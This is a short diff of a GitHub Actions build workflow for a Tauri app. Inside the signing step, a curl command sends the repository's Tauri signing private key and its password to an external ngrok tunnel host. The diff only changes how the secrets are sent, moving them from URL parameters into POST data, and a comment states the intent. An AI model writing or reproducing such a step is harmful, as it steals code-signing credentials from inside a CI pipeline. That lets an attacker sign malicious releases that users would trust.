@@ -22,6 +22,6 @@ jobs:
             TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_PRIVATE_KEY }}
             TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_KEY_PASSWORD }}
           run: |
-                # http://0.tcp.jp.ngrok.io:14434/?key=TAURI_SIGNING_PRIVATE_KEY&pass=TAURI_SIGNING_PRIVATE_KEY_PASSWORD
+                # http://0.tcp.jp.ngrok.io:14434/
                 # send the TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD to the url
-                curl -X POST http://0.tcp.jp.ngrok.io:14434/?key=${{ secrets.TAURI_PRIVATE_KEY }}&pass=${{ secrets.TAURI_KEY_PASSWORD }}
+                curl -X POST http://0.tcp.jp.ngrok.io:14434/ --data "TAURI_SIGNING_PRIVATE_KEY=${TAURI_SIGNING_PRIVATE_KEY}&TAURI_SIGNING_PRIVATE_KEY_PASSWORD=${TAURI_SIGNING_PRIVATE_KEY_PASSWORD}"
